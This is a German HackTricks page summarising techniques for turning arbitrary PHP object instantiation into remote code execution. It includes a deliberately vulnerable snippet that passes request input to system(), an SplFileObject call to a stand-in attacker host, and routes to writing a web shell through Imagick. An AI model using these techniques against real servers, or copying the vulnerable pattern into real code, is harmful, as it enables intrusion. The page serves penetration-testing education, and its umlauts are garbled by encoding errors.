# PHP - RCE Missbrauch der Objekterstellung: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

Dies ist im Wesentlichen eine Zusammenfassung von [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Einf√ºhrung

Die Erstellung neuer beliebiger Objekte, wie z.B. `new $_GET["a"]($_GET["a"])`, kann zu Remote Code Execution (RCE) f√ºhren, wie in einem [**Writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) detailliert beschrieben. Dieses Dokument zeigt verschiedene Strategien zur Erreichung von RCE auf.

## RCE √ºber benutzerdefinierte Klassen oder Autoloading

Die Syntax `new $a($b)` wird verwendet, um ein Objekt zu instanziieren, wobei **`$a`** den Klassennamen darstellt und **`$b`** das erste Argument ist, das an den Konstruktor √ºbergeben wird. Diese Variablen k√∂nnen aus Benutzereingaben wie GET/POST stammen, wo sie Zeichenketten oder Arrays sein k√∂nnen, oder aus JSON, wo sie als andere Typen vorliegen k√∂nnen.

Betrachten Sie den folgenden Codeausschnitt:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
In diesem Fall f√ºhrt das Setzen von `$a` auf `App` oder `App2` und `$b` auf einen Systembefehl (z. B. `uname -a`) zur Ausf√ºhrung dieses Befehls.

**Autoloading-Funktionen** k√∂nnen ausgenutzt werden, wenn keine solchen Klassen direkt zug√§nglich sind. Diese Funktionen laden automatisch Klassen aus Dateien, wenn sie ben√∂tigt werden, und werden mit `spl_autoload_register` oder `__autoload` definiert:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Das Verhalten des Autoloadings variiert je nach PHP-Version und bietet verschiedene M√∂glichkeiten f√ºr RCE.

## RCE √ºber integrierte Klassen

Fehlen benutzerdefinierter Klassen oder Autoloader, k√∂nnen **integrierte PHP-Klassen** f√ºr RCE ausreichen. Die Anzahl dieser Klassen variiert je nach PHP-Version und Erweiterungen zwischen 100 und 200. Sie k√∂nnen mit `get_declared_classes()` aufgelistet werden.

Interessante Konstruktoren k√∂nnen mithilfe der Reflection-API identifiziert werden, wie im folgenden Beispiel und dem Link [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF) gezeigt.

**RCE √ºber bestimmte Methoden umfasst:**

### **SSRF + Phar-Deserialisierung**

Die Klasse `SplFileObject` erm√∂glicht SSRF √ºber ihren Konstruktor und erm√∂glicht Verbindungen zu beliebigen URLs:
```php
new SplFileObject('http://attacker.com/');
```
SSRF kann zu Deserialisierungsangriffen in PHP-Versionen vor 8.0 f√ºhren, indem das Phar-Protokoll verwendet wird.

### **Ausnutzen von PDOs**

Der Konstruktor der PDO-Klasse erm√∂glicht Verbindungen zu Datenbanken √ºber DSN-Zeichenketten und erm√∂glicht potenziell die Erstellung von Dateien oder andere Interaktionen:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Versionen von PHP bis einschlie√ülich 5.3.22 und 5.4.12 waren anf√§llig f√ºr XXE-Angriffe √ºber die Konstruktoren `SoapClient` und `SimpleXMLElement`, abh√§ngig von der Version von libxml2.

## RCE √ºber Imagick-Erweiterung

Bei der Analyse der **Abh√§ngigkeiten eines Projekts** wurde festgestellt, dass **Imagick** f√ºr die **Befehlsausf√ºhrung** genutzt werden kann, indem neue Objekte instanziiert werden. Dadurch ergeben sich M√∂glichkeiten zur Ausnutzung von Schwachstellen.

### VID-Parser

Es wurde festgestellt, dass der VID-Parser Inhalte in einem beliebigen angegebenen Pfad im Dateisystem schreiben kann. Dadurch kann eine PHP-Shell in einem webzug√§nglichen Verzeichnis platziert werden, um Remote Code Execution (RCE) zu erreichen.

#### VID-Parser + Datei-Upload

Es ist zu beachten, dass PHP hochgeladene Dateien vor√ºbergehend in `/tmp/phpXXXXXX` speichert. Der VID-Parser in Imagick kann mit dem **msl**-Protokoll Platzhalter in Dateipfaden verarbeiten, um die tempor√§re Datei an einen ausgew√§hlten Ort zu √ºbertragen. Diese Methode bietet einen zus√§tzlichen Ansatz, um beliebige Dateien im Dateisystem zu schreiben.

### PHP-Crash + Brute Force

Eine Methode, die in der [**urspr√ºnglichen Beschreibung**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) beschrieben wird, beinhaltet das Hochladen von Dateien, die einen Serverabsturz verursachen, bevor sie gel√∂scht werden. Durch Brute-Force des Namens der tempor√§ren Datei wird es Imagick erm√∂glicht, beliebigen PHP-Code auszuf√ºhren. Diese Technik ist jedoch nur in einer veralteten Version von ImageMagick wirksam.

## Referenzen

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen** m√∂chten, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie Pull Requests an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
